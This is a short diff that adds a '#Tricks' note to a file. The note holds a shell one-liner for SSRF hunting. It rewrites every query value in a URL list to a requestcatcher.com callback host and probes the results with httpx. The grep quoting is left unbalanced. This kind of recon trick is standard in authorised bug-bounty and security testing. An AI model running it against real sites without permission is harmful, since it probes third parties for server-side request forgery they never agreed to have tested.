@@ -1,1 +1,4 @@
 
+#Tricks
+  ->cat allUrls.txt | grep "= | qsreplace https://ferhat.requestcatcher.com/ > ssrf.txt
+  ->cat ssrf.txt | httpx-fr
